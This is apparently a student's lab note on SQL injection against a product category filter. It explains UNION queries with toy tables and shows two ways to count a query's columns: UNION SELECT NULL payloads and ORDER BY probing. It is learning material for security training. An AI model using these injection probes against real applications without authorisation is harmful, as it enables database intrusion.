SQLi - product category filter

End goal: determine the number of columns returned by the query.

background (Union):

table1:         table2:
a | b            c | d
=====            =====
1 , 2           2, 3    
3, 4            4, 5   

Query #1: select a, b from table1
1, 2
3, 4

Query #2: select a, b from table1 UNION sleect c, d from table2
1, 2
3, 4
2, 3
4, 5 

Rule: 
- The number and the order of the columns must be the same in all queries 

SQL attack (way #1):
selec ? from table1 UNION select NULL 
-ERROR -> incorrect number of columns 

selec ? from table1 UNION select NULL, NULL, NULL
-200 response code -> correct number of columns

SQL attack (way #2):
select a, b from table1 ORDER BY 3
